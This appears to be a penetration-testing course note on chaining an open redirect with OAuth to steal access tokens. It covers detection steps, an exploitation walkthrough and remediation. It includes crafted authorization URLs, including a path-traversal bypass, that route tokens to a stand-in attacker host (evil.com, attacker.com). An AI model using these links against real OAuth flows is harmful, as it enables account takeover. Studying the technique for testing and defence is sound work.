---
tags: [vapt, open-redirect, oauth, critical, chaining]
difficulty: advanced
module: "24 - Open Redirect"
topic: "24.06 Open Redirect + OAuth (token stealing)"
---

# 24.06 — Open Redirect + OAuth (Token Stealing)

## What is it?
When Open Redirect is combined with an OAuth 2.0 flow, it escalates from a phishing vector into a **Critical Account Takeover** vulnerability.

In an OAuth flow (like "Log in with Google" or "Log in with Facebook"), the client application sends the user to the Authorization Server. Once the user approves the login, the Authorization Server redirects the user back to the client application, appending an `authorization_code` or `access_token` to the URL.

If the Authorization Server has weak validation on the `redirect_uri` parameter, OR if the client application's registered callback URL contains an Open Redirect, an attacker can manipulate the flow. The Authorization Server will append the sensitive token to the URL and redirect the user. If that redirect goes to the attacker's server, the attacker steals the token and can log in as the victim without ever knowing their password.

Think of it like giving a courier a top-secret briefcase to deliver to the "Branch Office." But the Branch Office has a sign on the door saying "We moved, deliver all packages to the Hacker Lair." The courier blindly follows the sign and hands the briefcase to the hacker.

## ASCII Diagram
```text
[Attacker creates malicious link]
https://auth-server.com/oauth/authorize?client_id=123&response_type=token&redirect_uri=https://client.com/callback?next=https://evil.com
       │
[Victim clicks link, is already logged into auth-server.com]
       ▼
[Auth Server]
Validates base URI: "https://client.com/callback" is allowed!
Generates Access Token.
Redirects to: https://client.com/callback?next=https://evil.com#access_token=SECRET
       │
       ▼
[Client Application (Has Open Redirect on /callback)]
Reads the `next` parameter.
Issues HTTP 302 Redirect to https://evil.com
       │
       ▼
[Victim's Browser]
Follows redirect to: https://evil.com#access_token=SECRET
       │
       ▼
[Attacker Server] ─── Steals the Access Token! Logs in as Victim!
```

## How to Find It
- **Manual steps:**
  1. Identify an application utilizing OAuth (Look for `client_id`, `redirect_uri`, `response_type` parameters in the URL during login).
  2. Check if the OAuth provider strictly validates the `redirect_uri`. Change the domain (e.g., `redirect_uri=https://evil.com`). If it works, the OAuth provider is vulnerable.
  3. If the OAuth provider strictly validates the domain (e.g., it must be `https://client.com`), hunt for an Open Redirect *anywhere* on `client.com`.
  4. If `client.com` has an Open Redirect at `https://client.com/logout?url=...`, set the `redirect_uri` to `https://client.com/logout?url=https://evil.com`.
  5. The OAuth provider will validate the domain (`client.com` is safe!), append the code, and redirect. Then, `client.com` will execute the Open Redirect, sending the code to you.

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Find an Open Redirect on the whitelisted client domain (or bypass the OAuth provider's whitelist directly).
  2. Craft the OAuth Authorization URL, setting the `redirect_uri` to trigger the Open Redirect.
  3. Send the link to the victim.
  4. When the victim clicks, the flow happens invisibly. The victim's browser hits the OAuth provider, grabs the token, hits the client app, and bounces the token to your server via the URL fragment (`#`) or query string (`?`).
  5. Capture the token from your web server logs.
  6. Use the token to access the victim's account via the API.

- **Actual payloads:**
  **Chaining Open Redirect via URL parameter:**
  ```text
  https://oauth.provider.com/auth?client_id=APP&redirect_uri=https://trusted.com/login?next=https://evil.com
  ```
  **Directory Traversal Bypass on `redirect_uri` (if validation is weak):**
  ```text
  https://oauth.provider.com/auth?client_id=APP&redirect_uri=https://trusted.com/callback/../../../../evil.com
  ```

## Real-World Example
A Bug Bounty hunter targeted a massive social media application. The app used Facebook for SSO. Facebook strictly validated the `redirect_uri` to ensure it ended in `.targetapp.com`. The hunter found an Open Redirect on the target's marketing blog: `https://blog.targetapp.com/exit?url=https://attacker.com`. The hunter crafted a Facebook OAuth link with `redirect_uri=https://blog.targetapp.com/exit?url=https://attacker.com`. Victims who clicked the link (and were already logged into Facebook) instantly had their Facebook OAuth tokens sent to the attacker, allowing the attacker to hijack their accounts on the target app.

## How to Fix It
- **Developer remediation:**
  **For OAuth Providers:** Require *exact* matching of the `redirect_uri`. Do not allow wildcard subdomains, path traversal, or trailing query parameters that weren't explicitly pre-registered by the developer.
  **For Client Applications:** Eradicate Open Redirects. If you must use dynamic `next=` parameters after an OAuth callback, cryptographically sign the `next=` parameter state using the OAuth `state` parameter, or strictly validate it against a hardcoded allowlist.

## Chaining Opportunities
- This vuln + [[19 - OAuth (Account Takeover)]] → This is the fundamental mechanism for escalating an Open Redirect into full Account Takeover in modern architectures.

## Related Notes
- [[01 - What is Open Redirect?]]
- [[05 - Open Redirect to Phishing]]
